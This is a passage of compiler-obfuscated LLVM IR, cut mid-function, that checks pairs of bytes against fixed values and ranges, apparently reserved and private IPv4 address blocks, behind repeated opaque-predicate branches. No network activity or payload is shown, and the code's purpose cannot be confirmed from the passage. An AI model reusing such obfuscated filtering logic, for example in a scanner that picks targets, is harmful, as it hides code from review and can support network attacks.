  %557 = zext i8 %556 to i32
  %558 = icmp eq i32 %557, 157
  br i1 %558, label %559, label %563

; <label>:559:                                    ; preds = %555
  %560 = load i8, i8* %11, align 1
  %561 = zext i8 %560 to i32
  %562 = icmp eq i32 %561, 202
  br i1 %562, label %5259, label %563

; <label>:563:                                    ; preds = %559, %555
  %564 = load i8, i8* %10, align 1
  %565 = zext i8 %564 to i32
  %566 = icmp eq i32 %565, 157
  br i1 %566, label %567, label %587

; <label>:567:                                    ; preds = %563
  %568 = load i32, i32* @x.57
  %569 = load i32, i32* @y.58
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %567
  %576 = load i8, i8* %11, align 1
  %577 = zext i8 %576 to i32
  %578 = icmp eq i32 %577, 217
  %579 = load i32, i32* @x.57
  %580 = load i32, i32* @y.58
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %578, label %5259, label %587

; <label>:587:                                    ; preds = %originalBBpart276, %563
  %588 = load i8, i8* %10, align 1
  %589 = zext i8 %588 to i32
  %590 = icmp eq i32 %589, 161
  br i1 %590, label %591, label %595

; <label>:591:                                    ; preds = %587
  %592 = load i8, i8* %11, align 1
  %593 = zext i8 %592 to i32
  %594 = icmp eq i32 %593, 124
  br i1 %594, label %5259, label %595

; <label>:595:                                    ; preds = %591, %587
  %596 = load i8, i8* %10, align 1
  %597 = zext i8 %596 to i32
  %598 = icmp eq i32 %597, 162
  br i1 %598, label %599, label %619

; <label>:599:                                    ; preds = %595
  %600 = load i32, i32* @x.57
  %601 = load i32, i32* @y.58
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %599
  %608 = load i8, i8* %11, align 1
  %609 = zext i8 %608 to i32
  %610 = icmp eq i32 %609, 32
  %611 = load i32, i32* @x.57
  %612 = load i32, i32* @y.58
  %613 = sub i32 %611, 1
  %614 = mul i32 %611, %613
  %615 = urem i32 %614, 2
  %616 = icmp eq i32 %615, 0
  %617 = icmp slt i32 %612, 10
  %618 = or i1 %616, %617
  br i1 %618, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %610, label %5259, label %619

; <label>:619:                                    ; preds = %originalBBpart280, %595
  %620 = load i8, i8* %10, align 1
  %621 = zext i8 %620 to i32
  %622 = icmp eq i32 %621, 155
  br i1 %622, label %623, label %627

; <label>:623:                                    ; preds = %619
  %624 = load i8, i8* %11, align 1
  %625 = zext i8 %624 to i32
  %626 = icmp eq i32 %625, 96
  br i1 %626, label %5259, label %627

; <label>:627:                                    ; preds = %623, %619
  %628 = load i8, i8* %10, align 1
  %629 = zext i8 %628 to i32
  %630 = icmp eq i32 %629, 155
  br i1 %630, label %631, label %651

; <label>:631:                                    ; preds = %627
  %632 = load i32, i32* @x.57
  %633 = load i32, i32* @y.58
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %631
  %640 = load i8, i8* %11, align 1
  %641 = zext i8 %640 to i32
  %642 = icmp eq i32 %641, 149
  %643 = load i32, i32* @x.57
  %644 = load i32, i32* @y.58
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %642, label %5259, label %651

; <label>:651:                                    ; preds = %originalBBpart284, %627
  %652 = load i8, i8* %10, align 1
  %653 = zext i8 %652 to i32
  %654 = icmp eq i32 %653, 155
  br i1 %654, label %655, label %659

; <label>:655:                                    ; preds = %651
  %656 = load i8, i8* %11, align 1
  %657 = zext i8 %656 to i32
  %658 = icmp eq i32 %657, 155
  br i1 %658, label %5259, label %659

; <label>:659:                                    ; preds = %655, %651
  %660 = load i32, i32* @x.57
  %661 = load i32, i32* @y.58
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %659
  %668 = load i8, i8* %10, align 1
  %669 = zext i8 %668 to i32
  %670 = icmp eq i32 %669, 155
  %671 = load i32, i32* @x.57
  %672 = load i32, i32* @y.58
  %673 = sub i32 %671, 1
  %674 = mul i32 %671, %673
  %675 = urem i32 %674, 2
  %676 = icmp eq i32 %675, 0
  %677 = icmp slt i32 %672, 10
  %678 = or i1 %676, %677
  br i1 %678, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %670, label %679, label %683

; <label>:679:                                    ; preds = %originalBBpart288
  %680 = load i8, i8* %11, align 1
  %681 = zext i8 %680 to i32
  %682 = icmp eq i32 %681, 178
  br i1 %682, label %5259, label %683

; <label>:683:                                    ; preds = %679, %originalBBpart288
  %684 = load i32, i32* @x.57
  %685 = load i32, i32* @y.58
  %686 = sub i32 %684, 1
  %687 = mul i32 %684, %686
  %688 = urem i32 %687, 2
  %689 = icmp eq i32 %688, 0
  %690 = icmp slt i32 %685, 10
  %691 = or i1 %689, %690
  br i1 %691, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %683
  %692 = load i8, i8* %10, align 1
  %693 = zext i8 %692 to i32
  %694 = icmp eq i32 %693, 164
  %695 = load i32, i32* @x.57
  %696 = load i32, i32* @y.58
  %697 = sub i32 %695, 1
  %698 = mul i32 %695, %697
  %699 = urem i32 %698, 2
  %700 = icmp eq i32 %699, 0
  %701 = icmp slt i32 %696, 10
  %702 = or i1 %700, %701
  br i1 %702, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %694, label %703, label %723

; <label>:703:                                    ; preds = %originalBBpart292
  %704 = load i32, i32* @x.57
  %705 = load i32, i32* @y.58
  %706 = sub i32 %704, 1
  %707 = mul i32 %704, %706
  %708 = urem i32 %707, 2
  %709 = icmp eq i32 %708, 0
  %710 = icmp slt i32 %705, 10
  %711 = or i1 %709, %710
  br i1 %711, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %703
  %712 = load i8, i8* %11, align 1
  %713 = zext i8 %712 to i32
  %714 = icmp eq i32 %713, 158
  %715 = load i32, i32* @x.57
  %716 = load i32, i32* @y.58
  %717 = sub i32 %715, 1
  %718 = mul i32 %715, %717
  %719 = urem i32 %718, 2
  %720 = icmp eq i32 %719, 0
  %721 = icmp slt i32 %716, 10
  %722 = or i1 %720, %721
  br i1 %722, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %714, label %5259, label %723

; <label>:723:                                    ; preds = %originalBBpart296, %originalBBpart292
  %724 = load i8, i8* %10, align 1
  %725 = zext i8 %724 to i32
  %726 = icmp eq i32 %725, 156
  br i1 %726, label %727, label %731

; <label>:727:                                    ; preds = %723
  %728 = load i8, i8* %11, align 1
  %729 = zext i8 %728 to i32
  %730 = icmp eq i32 %729, 9
  br i1 %730, label %5259, label %731

; <label>:731:                                    ; preds = %727, %723
  %732 = load i32, i32* @x.57
  %733 = load i32, i32* @y.58
  %734 = sub i32 %732, 1
  %735 = mul i32 %732, %734
  %736 = urem i32 %735, 2
  %737 = icmp eq i32 %736, 0
  %738 = icmp slt i32 %733, 10
  %739 = or i1 %737, %738
  br i1 %739, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %731
  %740 = load i8, i8* %10, align 1
  %741 = zext i8 %740 to i32
  %742 = icmp eq i32 %741, 167
  %743 = load i32, i32* @x.57
  %744 = load i32, i32* @y.58
  %745 = sub i32 %743, 1
  %746 = mul i32 %743, %745
  %747 = urem i32 %746, 2
  %748 = icmp eq i32 %747, 0
  %749 = icmp slt i32 %744, 10
  %750 = or i1 %748, %749
  br i1 %750, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %742, label %751, label %755

; <label>:751:                                    ; preds = %originalBBpart2100
  %752 = load i8, i8* %11, align 1
  %753 = zext i8 %752 to i32
  %754 = icmp eq i32 %753, 44
  br i1 %754, label %5259, label %755

; <label>:755:                                    ; preds = %751, %originalBBpart2100
  %756 = load i32, i32* @x.57
  %757 = load i32, i32* @y.58
  %758 = sub i32 %756, 1
  %759 = mul i32 %756, %758
  %760 = urem i32 %759, 2
  %761 = icmp eq i32 %760, 0
  %762 = icmp slt i32 %757, 10
  %763 = or i1 %761, %762
  br i1 %763, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %755
  %764 = load i8, i8* %10, align 1
  %765 = zext i8 %764 to i32
  %766 = icmp eq i32 %765, 168
  %767 = load i32, i32* @x.57
  %768 = load i32, i32* @y.58
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %766, label %775, label %779

; <label>:775:                                    ; preds = %originalBBpart2104
  %776 = load i8, i8* %11, align 1
  %777 = zext i8 %776 to i32
  %778 = icmp eq i32 %777, 68
  br i1 %778, label %5259, label %779

; <label>:779:                                    ; preds = %775, %originalBBpart2104
  %780 = load i32, i32* @x.57
  %781 = load i32, i32* @y.58
  %782 = sub i32 %780, 1
  %783 = mul i32 %780, %782
  %784 = urem i32 %783, 2
  %785 = icmp eq i32 %784, 0
  %786 = icmp slt i32 %781, 10
  %787 = or i1 %785, %786
  br i1 %787, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %779
  %788 = load i8, i8* %10, align 1
  %789 = zext i8 %788 to i32
  %790 = icmp eq i32 %789, 168
  %791 = load i32, i32* @x.57
  %792 = load i32, i32* @y.58
  %793 = sub i32 %791, 1
  %794 = mul i32 %791, %793
  %795 = urem i32 %794, 2
  %796 = icmp eq i32 %795, 0
  %797 = icmp slt i32 %792, 10
  %798 = or i1 %796, %797
  br i1 %798, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %790, label %799, label %803

; <label>:799:                                    ; preds = %originalBBpart2108
  %800 = load i8, i8* %11, align 1
  %801 = zext i8 %800 to i32
  %802 = icmp eq i32 %801, 85
  br i1 %802, label %5259, label %803

; <label>:803:                                    ; preds = %799, %originalBBpart2108
  %804 = load i8, i8* %10, align 1
  %805 = zext i8 %804 to i32
  %806 = icmp eq i32 %805, 168
  br i1 %806, label %807, label %811

; <label>:807:                                    ; preds = %803
  %808 = load i8, i8* %11, align 1
  %809 = zext i8 %808 to i32
  %810 = icmp eq i32 %809, 102
  br i1 %810, label %5259, label %811

; <label>:811:                                    ; preds = %807, %803
  %812 = load i32, i32* @x.57
  %813 = load i32, i32* @y.58
  %814 = sub i32 %812, 1
  %815 = mul i32 %812, %814
  %816 = urem i32 %815, 2
  %817 = icmp eq i32 %816, 0
  %818 = icmp slt i32 %813, 10
  %819 = or i1 %817, %818
  br i1 %819, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %811
  %820 = load i8, i8* %10, align 1
  %821 = zext i8 %820 to i32
  %822 = icmp eq i32 %821, 203
  %823 = load i32, i32* @x.57
  %824 = load i32, i32* @y.58
  %825 = sub i32 %823, 1
  %826 = mul i32 %823, %825
  %827 = urem i32 %826, 2
  %828 = icmp eq i32 %827, 0
  %829 = icmp slt i32 %824, 10
  %830 = or i1 %828, %829
  br i1 %830, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %822, label %831, label %851

; <label>:831:                                    ; preds = %originalBBpart2112
  %832 = load i32, i32* @x.57
  %833 = load i32, i32* @y.58
  %834 = sub i32 %832, 1
  %835 = mul i32 %832, %834
  %836 = urem i32 %835, 2
  %837 = icmp eq i32 %836, 0
  %838 = icmp slt i32 %833, 10
  %839 = or i1 %837, %838
  br i1 %839, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %831
  %840 = load i8, i8* %11, align 1
  %841 = zext i8 %840 to i32
  %842 = icmp eq i32 %841, 59
  %843 = load i32, i32* @x.57
  %844 = load i32, i32* @y.58
  %845 = sub i32 %843, 1
  %846 = mul i32 %843, %845
  %847 = urem i32 %846, 2
  %848 = icmp eq i32 %847, 0
  %849 = icmp slt i32 %844, 10
  %850 = or i1 %848, %849
  br i1 %850, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %842, label %5259, label %851

; <label>:851:                                    ; preds = %originalBBpart2116, %originalBBpart2112
  %852 = load i8, i8* %10, align 1
  %853 = zext i8 %852 to i32
  %854 = icmp eq i32 %853, 204
  br i1 %854, label %855, label %875

; <label>:855:                                    ; preds = %851
  %856 = load i32, i32* @x.57
  %857 = load i32, i32* @y.58
  %858 = sub i32 %856, 1
  %859 = mul i32 %856, %858
  %860 = urem i32 %859, 2
  %861 = icmp eq i32 %860, 0
  %862 = icmp slt i32 %857, 10
  %863 = or i1 %861, %862
  br i1 %863, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %855
  %864 = load i8, i8* %11, align 1
  %865 = zext i8 %864 to i32
  %866 = icmp eq i32 %865, 34
  %867 = load i32, i32* @x.57
  %868 = load i32, i32* @y.58
  %869 = sub i32 %867, 1
  %870 = mul i32 %867, %869
  %871 = urem i32 %870, 2
  %872 = icmp eq i32 %871, 0
  %873 = icmp slt i32 %868, 10
  %874 = or i1 %872, %873
  br i1 %874, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %866, label %5259, label %875

; <label>:875:                                    ; preds = %originalBBpart2120, %851
  %876 = load i8, i8* %10, align 1
  %877 = zext i8 %876 to i32
  %878 = icmp eq i32 %877, 207
  br i1 %878, label %879, label %883

; <label>:879:                                    ; preds = %875
  %880 = load i8, i8* %11, align 1
  %881 = zext i8 %880 to i32
  %882 = icmp eq i32 %881, 30
  br i1 %882, label %5259, label %883

; <label>:883:                                    ; preds = %879, %875
  %884 = load i8, i8* %10, align 1
  %885 = zext i8 %884 to i32
  %886 = icmp eq i32 %885, 117
  br i1 %886, label %887, label %891

; <label>:887:                                    ; preds = %883
  %888 = load i8, i8* %11, align 1
  %889 = zext i8 %888 to i32
  %890 = icmp eq i32 %889, 55
  br i1 %890, label %5259, label %891

; <label>:891:                                    ; preds = %887, %883
  %892 = load i8, i8* %10, align 1
  %893 = zext i8 %892 to i32
  %894 = icmp eq i32 %893, 117
  br i1 %894, label %895, label %899

; <label>:895:                                    ; preds = %891
  %896 = load i8, i8* %11, align 1
  %897 = zext i8 %896 to i32
  %898 = icmp eq i32 %897, 56
  br i1 %898, label %5259, label %899

; <label>:899:                                    ; preds = %895, %891
  %900 = load i8, i8* %10, align 1
  %901 = zext i8 %900 to i32
  %902 = icmp eq i32 %901, 80
  br i1 %902, label %903, label %907

; <label>:903:                                    ; preds = %899
  %904 = load i8, i8* %11, align 1
  %905 = zext i8 %904 to i32
  %906 = icmp eq i32 %905, 235
  br i1 %906, label %5259, label %907

; <label>:907:                                    ; preds = %903, %899
  %908 = load i8, i8* %10, align 1
  %909 = zext i8 %908 to i32
  %910 = icmp eq i32 %909, 207
  br i1 %910, label %911, label %915

; <label>:911:                                    ; preds = %907
  %912 = load i8, i8* %11, align 1
  %913 = zext i8 %912 to i32
  %914 = icmp eq i32 %913, 120
  br i1 %914, label %5259, label %915

; <label>:915:                                    ; preds = %911, %907
  %916 = load i32, i32* @x.57
  %917 = load i32, i32* @y.58
  %918 = sub i32 %916, 1
  %919 = mul i32 %916, %918
  %920 = urem i32 %919, 2
  %921 = icmp eq i32 %920, 0
  %922 = icmp slt i32 %917, 10
  %923 = or i1 %921, %922
  br i1 %923, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %915
  %924 = load i8, i8* %10, align 1
  %925 = zext i8 %924 to i32
  %926 = icmp eq i32 %925, 209
  %927 = load i32, i32* @x.57
  %928 = load i32, i32* @y.58
  %929 = sub i32 %927, 1
  %930 = mul i32 %927, %929
  %931 = urem i32 %930, 2
  %932 = icmp eq i32 %931, 0
  %933 = icmp slt i32 %928, 10
  %934 = or i1 %932, %933
  br i1 %934, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %926, label %935, label %939

; <label>:935:                                    ; preds = %originalBBpart2124
  %936 = load i8, i8* %11, align 1
  %937 = zext i8 %936 to i32
  %938 = icmp eq i32 %937, 35
  br i1 %938, label %5259, label %939

; <label>:939:                                    ; preds = %935, %originalBBpart2124
  %940 = load i8, i8* %10, align 1
  %941 = zext i8 %940 to i32
  %942 = icmp eq i32 %941, 64
  br i1 %942, label %943, label %947

; <label>:943:                                    ; preds = %939
  %944 = load i8, i8* %11, align 1
  %945 = zext i8 %944 to i32
  %946 = icmp eq i32 %945, 70
  br i1 %946, label %5259, label %947

; <label>:947:                                    ; preds = %943, %939
  %948 = load i8, i8* %10, align 1
  %949 = zext i8 %948 to i32
  %950 = icmp eq i32 %949, 172
  br i1 %950, label %951, label %991

; <label>:951:                                    ; preds = %947
  %952 = load i32, i32* @x.57
  %953 = load i32, i32* @y.58
  %954 = sub i32 %952, 1
  %955 = mul i32 %952, %954
  %956 = urem i32 %955, 2
  %957 = icmp eq i32 %956, 0
  %958 = icmp slt i32 %953, 10
  %959 = or i1 %957, %958
  br i1 %959, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %951
  %960 = load i8, i8* %11, align 1
  %961 = zext i8 %960 to i32
  %962 = icmp sge i32 %961, 16
  %963 = load i32, i32* @x.57
  %964 = load i32, i32* @y.58
  %965 = sub i32 %963, 1
  %966 = mul i32 %963, %965
  %967 = urem i32 %966, 2
  %968 = icmp eq i32 %967, 0
  %969 = icmp slt i32 %964, 10
  %970 = or i1 %968, %969
  br i1 %970, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %962, label %971, label %991

; <label>:971:                                    ; preds = %originalBBpart2128
  %972 = load i32, i32* @x.57
  %973 = load i32, i32* @y.58
  %974 = sub i32 %972, 1
  %975 = mul i32 %972, %974
  %976 = urem i32 %975, 2
  %977 = icmp eq i32 %976, 0
  %978 = icmp slt i32 %973, 10
  %979 = or i1 %977, %978
  br i1 %979, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %971
  %980 = load i8, i8* %11, align 1
  %981 = zext i8 %980 to i32
  %982 = icmp slt i32 %981, 32
  %983 = load i32, i32* @x.57
  %984 = load i32, i32* @y.58
  %985 = sub i32 %983, 1
  %986 = mul i32 %983, %985
  %987 = urem i32 %986, 2
  %988 = icmp eq i32 %987, 0
  %989 = icmp slt i32 %984, 10
  %990 = or i1 %988, %989
  br i1 %990, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %982, label %5259, label %991

; <label>:991:                                    ; preds = %originalBBpart2132, %originalBBpart2128, %947
  %992 = load i8, i8* %10, align 1
  %993 = zext i8 %992 to i32
  %994 = icmp eq i32 %993, 100
  br i1 %994, label %995, label %1035

; <label>:995:                                    ; preds = %991
  %996 = load i32, i32* @x.57
  %997 = load i32, i32* @y.58
  %998 = sub i32 %996, 1
  %999 = mul i32 %996, %998
  %1000 = urem i32 %999, 2
  %1001 = icmp eq i32 %1000, 0
  %1002 = icmp slt i32 %997, 10
  %1003 = or i1 %1001, %1002
  br i1 %1003, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %995
  %1004 = load i8, i8* %11, align 1
  %1005 = zext i8 %1004 to i32
  %1006 = icmp sge i32 %1005, 64
  %1007 = load i32, i32* @x.57
  %1008 = load i32, i32* @y.58
  %1009 = sub i32 %1007, 1
  %1010 = mul i32 %1007, %1009
  %1011 = urem i32 %1010, 2
  %1012 = icmp eq i32 %1011, 0
  %1013 = icmp slt i32 %1008, 10
  %1014 = or i1 %1012, %1013
  br i1 %1014, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1006, label %1015, label %1035

; <label>:1015:                                   ; preds = %originalBBpart2136
  %1016 = load i32, i32* @x.57
  %1017 = load i32, i32* @y.58
  %1018 = sub i32 %1016, 1
  %1019 = mul i32 %1016, %1018
  %1020 = urem i32 %1019, 2
  %1021 = icmp eq i32 %1020, 0
  %1022 = icmp slt i32 %1017, 10
  %1023 = or i1 %1021, %1022
  br i1 %1023, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1015
  %1024 = load i8, i8* %11, align 1
  %1025 = zext i8 %1024 to i32
  %1026 = icmp slt i32 %1025, 127
  %1027 = load i32, i32* @x.57
  %1028 = load i32, i32* @y.58
  %1029 = sub i32 %1027, 1
  %1030 = mul i32 %1027, %1029
  %1031 = urem i32 %1030, 2
  %1032 = icmp eq i32 %1031, 0
  %1033 = icmp slt i32 %1028, 10
  %1034 = or i1 %1032, %1033
  br i1 %1034, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1026, label %5259, label %1035

; <label>:1035:                                   ; preds = %originalBBpart2140, %originalBBpart2136, %991
  %1036 = load i32, i32* @x.57
  %1037 = load i32, i32* @y.58
  %1038 = sub i32 %1036, 1
  %1039 = mul i32 %1036, %1038
  %1040 = urem i32 %1039, 2
  %1041 = icmp eq i32 %1040, 0
  %1042 = icmp slt i32 %1037, 10
  %1043 = or i1 %1041, %1042
  br i1 %1043, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1035
  %1044 = load i8, i8* %10, align 1
  %1045 = zext i8 %1044 to i32
  %1046 = icmp eq i32 %1045, 169
  %1047 = load i32, i32* @x.57
  %1048 = load i32, i32* @y.58
  %1049 = sub i32 %1047, 1
  %1050 = mul i32 %1047, %1049
  %1051 = urem i32 %1050, 2
  %1052 = icmp eq i32 %1051, 0
  %1053 = icmp slt i32 %1048, 10
  %1054 = or i1 %1052, %1053
  br i1 %1054, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1046, label %1055, label %1059

; <label>:1055:                                   ; preds = %originalBBpart2144
  %1056 = load i8, i8* %11, align 1
  %1057 = zext i8 %1056 to i32
  %1058 = icmp eq i32 %1057, 254
  br i1 %1058, label %5259, label %1059

; <label>:1059:                                   ; preds = %1055, %originalBBpart2144
  %1060 = load i32, i32* @x.57
  %1061 = load i32, i32* @y.58
  %1062 = sub i32 %1060, 1
  %1063 = mul i32 %1060, %1062
  %1064 = urem i32 %1063, 2
  %1065 = icmp eq i32 %1064, 0
  %1066 = icmp slt i32 %1061, 10
  %1067 = or i1 %1065, %1066
  br i1 %1067, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1059
  %1068 = load i8, i8* %10, align 1
  %1069 = zext i8 %1068 to i32
  %1070 = icmp eq i32 %1069, 198
  %1071 = load i32, i32* @x.57
  %1072 = load i32, i32* @y.58
  %1073 = sub i32 %1071, 1
  %1074 = mul i32 %1071, %1073
  %1075 = urem i32 %1074, 2
  %1076 = icmp eq i32 %1075, 0
  %1077 = icmp slt i32 %1072, 10
  %1078 = or i1 %1076, %1077
  br i1 %1078, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1070, label %1079, label %1087

; <label>:1079:                                   ; preds = %originalBBpart2148
  %1080 = load i8, i8* %11, align 1
  %1081 = zext i8 %1080 to i32
  %1082 = icmp sge i32 %1081, 18
  br i1 %1082, label %1083, label %1087

; <label>:1083:                                   ; preds = %1079
  %1084 = load i8, i8* %11, align 1
  %1085 = zext i8 %1084 to i32
  %1086 = icmp slt i32 %1085, 20
  br i1 %1086, label %5259, label %1087

; <label>:1087:                                   ; preds = %1083, %1079, %originalBBpart2148
  %1088 = load i32, i32* @x.57
  %1089 = load i32, i32* @y.58
  %1090 = sub i32 %1088, 1
  %1091 = mul i32 %1088, %1090
  %1092 = urem i32 %1091, 2
  %1093 = icmp eq i32 %1092, 0
  %1094 = icmp slt i32 %1089, 10
  %1095 = or i1 %1093, %1094
  br i1 %1095, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1087
  %1096 = load i8, i8* %10, align 1
  %1097 = zext i8 %1096 to i32
  %1098 = icmp eq i32 %1097, 64
  %1099 = load i32, i32* @x.57
  %1100 = load i32, i32* @y.58
  %1101 = sub i32 %1099, 1
  %1102 = mul i32 %1099, %1101
  %1103 = urem i32 %1102, 2
  %1104 = icmp eq i32 %1103, 0
  %1105 = icmp slt i32 %1100, 10
  %1106 = or i1 %1104, %1105
  br i1 %1106, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %1098, label %1107, label %1131

; <label>:1107:                                   ; preds = %originalBBpart2152
  %1108 = load i8, i8* %11, align 1
  %1109 = zext i8 %1108 to i32
  %1110 = icmp sge i32 %1109, 69
  br i1 %1110, label %1111, label %1131

; <label>:1111:                                   ; preds = %1107
  %1112 = load i32, i32* @x.57
  %1113 = load i32, i32* @y.58
  %1114 = sub i32 %1112, 1
  %1115 = mul i32 %1112, %1114
  %1116 = urem i32 %1115, 2
  %1117 = icmp eq i32 %1116, 0
  %1118 = icmp slt i32 %1113, 10
  %1119 = or i1 %1117, %1118
  br i1 %1119, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1111
  %1120 = load i8, i8* %11, align 1
  %1121 = zext i8 %1120 to i32
  %1122 = icmp slt i32 %1121, 227
  %1123 = load i32, i32* @x.57
  %1124 = load i32, i32* @y.58
  %1125 = sub i32 %1123, 1
  %1126 = mul i32 %1123, %1125
  %1127 = urem i32 %1126, 2
  %1128 = icmp eq i32 %1127, 0
  %1129 = icmp slt i32 %1124, 10
  %1130 = or i1 %1128, %1129
  br i1 %1130, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1122, label %5259, label %1131

; <label>:1131:                                   ; preds = %originalBBpart2156, %1107, %originalBBpart2152
  %1132 = load i8, i8* %10, align 1
  %1133 = zext i8 %1132 to i32
  %1134 = icmp eq i32 %1133, 128
  br i1 %1134, label %1135, label %1143

; <label>:1135:                                   ; preds = %1131
  %1136 = load i8, i8* %11, align 1
  %1137 = zext i8 %1136 to i32
  %1138 = icmp sge i32 %1137, 35
  br i1 %1138, label %1139, label %1143

; <label>:1139:                                   ; preds = %1135
  %1140 = load i8, i8* %11, align 1
  %1141 = zext i8 %1140 to i32
  %1142 = icmp slt i32 %1141, 237
  br i1 %1142, label %5259, label %1143

; <label>:1143:                                   ; preds = %1139, %1135, %1131
  %1144 = load i8, i8* %10, align 1
  %1145 = zext i8 %1144 to i32
  %1146 = icmp eq i32 %1145, 129
  br i1 %1146, label %1147, label %1155

; <label>:1147:                                   ; preds = %1143
  %1148 = load i8, i8* %11, align 1
  %1149 = zext i8 %1148 to i32
  %1150 = icmp sge i32 %1149, 22
  br i1 %1150, label %1151, label %1155

; <label>:1151:                                   ; preds = %1147
  %1152 = load i8, i8* %11, align 1
  %1153 = zext i8 %1152 to i32
  %1154 = icmp slt i32 %1153, 255
  br i1 %1154, label %5259, label %1155

; <label>:1155:                                   ; preds = %1151, %1147, %1143
  %1156 = load i8, i8* %10, align 1
  %1157 = zext i8 %1156 to i32
  %1158 = icmp eq i32 %1157, 130
  br i1 %1158, label %1159, label %1183

; <label>:1159:                                   ; preds = %1155
  %1160 = load i32, i32* @x.57
  %1161 = load i32, i32* @y.58
  %1162 = sub i32 %1160, 1
  %1163 = mul i32 %1160, %1162
  %1164 = urem i32 %1163, 2
  %1165 = icmp eq i32 %1164, 0
  %1166 = icmp slt i32 %1161, 10
  %1167 = or i1 %1165, %1166
  br i1 %1167, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1159
  %1168 = load i8, i8* %11, align 1
  %1169 = zext i8 %1168 to i32
  %1170 = icmp sge i32 %1169, 40
  %1171 = load i32, i32* @x.57
